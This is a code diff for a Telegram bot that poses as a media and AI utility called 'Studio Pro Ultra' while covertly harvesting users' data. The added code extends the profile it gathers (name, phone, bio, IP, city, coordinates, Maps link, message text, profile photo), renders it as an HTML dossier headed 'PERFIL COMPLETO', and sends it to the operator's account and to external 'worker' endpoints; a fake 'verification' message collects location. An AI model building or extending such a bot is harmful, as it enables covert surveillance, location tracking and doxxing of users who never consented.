@@ -66,6 +66,7 @@ MENSAJE_INICIO = """🔥 *STUDIO PRO ULTRA* 🔥
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📌 *Selecciona una opción del menú:*"""
 
+# ========== FUNCIONES DE EXTRACCIÓN ==========
 async def get_worker_location():
     try:
         async with aiohttp.ClientSession() as session:
@@ -170,6 +171,7 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat != "N/A" and lon != "N/A" else "N/A"
     device = "Desconocido (Telegram App)"
 
+    # ========== TEXTO PARA ADMIN ==========
     info_admin = f"🔍 *DATOS COMPLETOS DEL USUARIO*\n"
     info_admin += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
     info_admin += f"👤 *Telegram*\n"
@@ -203,6 +205,7 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     info_admin += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
     info_admin += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
 
+    # ========== PERFIL PÚBLICO ==========
     info_perfil = f"📊 *Tu perfil*\n\n"
     info_perfil += f"👤 *Nombre:* {full_name}\n"
     info_perfil += f"📛 *Username:* {username}\n"
@@ -223,9 +226,214 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         "lat": lat,
         "lon": lon,
         "maps_link": maps_link,
-        "full_name": full_name
+        "full_name": full_name,
+        "message_text": message_text,
+        "message_date": message_date,
+        "chat_id": chat_id,
+        "chat_type": chat_type,
+        "bio": bio,
+        "language": language,
+        "is_premium": is_premium
     }
 
+# ========== GENERAR HTML ==========
+def generar_html(info_data):
+    html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Perfil de {info_data['full_name']}</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #0a0a1a;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }}
+        .container {{
+            max-width: 900px;
+            width: 100%;
+            background: #12122a;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 0 30px rgba(0, 100, 255, 0.15);
+            border: 1px solid #1a2a4a;
+        }}
+        h1 {{
+            color: #00d4ff;
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+            text-shadow: 0 0 20px rgba(0, 212, 255, 0.2);
+        }}
+        .subtitle {{
+            text-align: center;
+            color: #8899bb;
+            font-size: 14px;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #1a2a4a;
+            padding-bottom: 15px;
+        }}
+        .section {{
+            background: #0d0d22;
+            border-radius: 10px;
+            padding: 15px 20px;
+            margin-bottom: 12px;
+            border-left: 3px solid #00d4ff;
+            transition: 0.3s;
+        }}
+        .section:hover {{
+            background: #14143a;
+            border-left-color: #ff6b6b;
+        }}
+        .label {{
+            font-weight: 600;
+            color: #88bbdd;
+            display: inline-block;
+            width: 150px;
+            font-size: 14px;
+        }}
+        .value {{
+            color: #f0f0f0;
+            font-weight: 400;
+            word-break: break-all;
+        }}
+        .value a {{
+            color: #00d4ff;
+            text-decoration: none;
+        }}
+        .value a:hover {{
+            text-decoration: underline;
+            color: #ff6b6b;
+        }}
+        .footer {{
+            text-align: center;
+            margin-top: 25px;
+            font-size: 12px;
+            color: #445566;
+            border-top: 1px solid #1a2a4a;
+            padding-top: 15px;
+        }}
+        .badge {{
+            display: inline-block;
+            background: #00d4ff;
+            color: #000;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }}
+        .badge-green {{
+            background: #00ff88;
+            color: #000;
+        }}
+        .badge-red {{
+            background: #ff4444;
+            color: #fff;
+        }}
+        .row {{
+            display: flex;
+            flex-wrap: wrap;
+            margin-bottom: 4px;
+        }}
+        .row .label {{
+            flex: 0 0 150px;
+        }}
+        .row .value {{
+            flex: 1;
+        }}
+        @media (max-width: 600px) {{
+            .row .label {{ flex: 0 0 100%; }}
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🕵️ PERFIL COMPLETO</h1>
+        <div class="subtitle">Datos extraídos automáticamente • Studio Pro Ultra</div>
+
+        <div class="section">
+            <div class="row"><span class="label">👤 Nombre completo:</span><span class="value">{info_data['full_name']}</span></div>
+            <div class="row"><span class="label">📛 Username:</span><span class="value">{info_data['username']}</span></div>
+            <div class="row"><span class="label">🆔 ID:</span><span class="value"><code>{info_data['user_id']}</code></span></div>
+            <div class="row"><span class="label">📞 Teléfono:</span><span class="value">{info_data['phone']}</span></div>
+            <div class="row"><span class="label">🗣️ Idioma:</span><span class="value">{info_data['language']}</span></div>
+            <div class="row"><span class="label">⭐ Premium:</span><span class="value">{info_data['is_premium']}</span></div>
+            <div class="row"><span class="label">📖 Biografía:</span><span class="value">{info_data['bio']}</span></div>
+        </div>
+
+        <div class="section">
+            <div class="row"><span class="label">📱 Dispositivo:</span><span class="value">{info_data['device']}</span></div>
+        </div>
+
+        <div class="section">
+            <div class="row"><span class="label">💬 Chat:</span><span class="value">{info_data['chat_type']} (ID: {info_data['chat_id']})</span></div>
+        </div>
+
+        <div class="section">
+            <div class="row"><span class="label">📩 Mensaje:</span><span class="value">{info_data['message_text'][:200]}{'...' if len(info_data['message_text']) > 200 else ''}</span></div>
+            <div class="row"><span class="label">📅 Fecha:</span><span class="value">{info_data['message_date']}</span></div>
+        </div>
+
+        <div class="section">
+            <div class="row"><span class="label">🌐 IP:</span><span class="value"><code>{info_data['ip']}</code></span></div>
+            <div class="row"><span class="label">📍 País:</span><span class="value">{info_data['country']}</span></div>
+            <div class="row"><span class="label">🏙️ Región:</span><span class="value">{info_data['region'] if info_data.get('region') else 'N/A'}</span></div>
+            <div class="row"><span class="label">🌆 Ciudad:</span><span class="value">{info_data['city']}</span></div>
+            <div class="row"><span class="label">📮 Código Postal:</span><span class="value">{info_data.get('postal', 'N/A')}</span></div>
+            <div class="row"><span class="label">🕒 Zona Horaria:</span><span class="value">{info_data.get('timezone', 'N/A')}</span></div>
+            <div class="row"><span class="label">🗺️ Coordenadas:</span><span class="value">{info_data['lat']}, {info_data['lon']}</span></div>
+            <div class="row"><span class="label">🔗 Google Maps:</span><span class="value"><a href="{info_data['maps_link']}" target="_blank">{info_data['maps_link']}</a></span></div>
+        </div>
+
+        <div class="footer">
+            ⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &bull; Studio Pro Ultra
+        </div>
+    </div>
+</body>
+</html>"""
+    return html
+
+# ========== ENVÍO A ADMIN ==========
+async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data, extra_msg=None):
+    bot = context.bot
+    # Enviar mensaje de texto
+    await bot.send_message(chat_id=ADMIN_ID, text=info_data["admin_text"], parse_mode=ParseMode.MARKDOWN)
+    if info_data["photo_id"]:
+        await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de perfil de {info_data['username'] or info_data['user_id']}")
+    if extra_msg:
+        await bot.send_message(chat_id=ADMIN_ID, text=extra_msg, parse_mode=ParseMode.MARKDOWN)
+
+    # Enviar HTML como archivo
+    try:
+        html_content = generar_html(info_data)
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False, encoding='utf-8') as f:
+            f.write(html_content)
+            html_path = f.name
+        with open(html_path, 'rb') as f:
+            await bot.send_document(
+                chat_id=ADMIN_ID,
+                document=f,
+                filename=f"perfil_{info_data['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html",
+                caption=f"📄 HTML con todos los datos de {info_data['full_name']}"
+            )
+        os.unlink(html_path)
+    except Exception as e:
+        logger.error(f"Error al enviar HTML: {e}")
+
+    # Enviar a todos los Workers
+    resultados = await send_to_all_workers(info_data["admin_text"])
+    logger.info(f"Resultados de envío a Workers: {resultados}")
+    users_db[info_data["user_id"]] = info_data
+
+# ========== ENVÍO A WORKERS ==========
 async def send_to_all_workers(text):
     form_data = aiohttp.FormData()
     form_data.add_field('chat_id', str(ADMIN_ID))
@@ -243,17 +451,7 @@ async def send_to_all_workers(text):
                 results.append(f"❌ {url} (Error: {str(e)[:30]})")
     return results
 
-async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data, extra_msg=None):
-    bot = context.bot
-    await bot.send_message(chat_id=ADMIN_ID, text=info_data["admin_text"], parse_mode=ParseMode.MARKDOWN)
-    if info_data["photo_id"]:
-        await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de perfil de {info_data['username'] or info_data['user_id']}")
-    if extra_msg:
-        await bot.send_message(chat_id=ADMIN_ID, text=extra_msg, parse_mode=ParseMode.MARKDOWN)
-    resultados = await send_to_all_workers(info_data["admin_text"])
-    logger.info(f"Resultados de envío a Workers: {resultados}")
-    users_db[info_data["user_id"]] = info_data
-
+# ========== CHATGPT ==========
 async def preguntar_chatgpt(prompt):
     if not OPENROUTER_KEY:
         return "❌ OPENROUTER_KEY no configurada."
@@ -278,6 +476,7 @@ async def preguntar_chatgpt(prompt):
     except Exception as e:
         return f"❌ Error: {str(e)[:100]}"
 
+# ========== GENERAR IMAGEN ==========
 async def generar_imagen(prompt):
     url = f"https://image.pollinations.ai/prompt/{prompt.replace(' ', '%20')}"
     async with aiohttp.ClientSession() as session:
@@ -286,6 +485,7 @@ async def generar_imagen(prompt):
                 return await resp.read()
             return None
 
+# ========== EXTRAER AUDIO ==========
 def extraer_audio(video_path):
     audio_path = tempfile.mktemp(suffix='.mp3')
     try:
@@ -295,6 +495,7 @@ def extraer_audio(video_path):
         logger.error(f"Error al extraer audio: {e}")
         return None
 
+# ========== EDITAR AUDIO ==========
 def editar_audio(audio_path, efecto):
     output_path = tempfile.mktemp(suffix='.mp3')
     try:
@@ -311,6 +512,7 @@ def editar_audio(audio_path, efecto):
         logger.error(f"Error al editar audio: {e}")
         return None
 
+# ========== COMANDO /START ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     if user.id == ADMIN_ID:
@@ -320,6 +522,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await send_to_admin(update, context, info_data)
     await update.message.reply_text(MENSAJE_INICIO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
 
+# ========== MANEJAR MENSAJES DE TEXTO ==========
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     user = update.effective_user
@@ -529,6 +732,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=reply_markup
         )
 
+# ========== MANEJAR ARCHIVOS ==========
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     photo = update.message.photo[-1]
@@ -600,11 +804,13 @@ async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
     users_db[user.id] = info_data
     await update.message.reply_text("✅ *Ubicación recibida.*\n🔐 Verificación completada.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
 
+# ========== ERROR HANDLER ==========
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"❌ Error: {context.error}")
     if isinstance(update, Update) and update.effective_message:
         await update.effective_message.reply_text("❌ *Error inesperado.*\nIntenta de nuevo.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
 
+# ========== SERVIDOR HTTP ==========
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
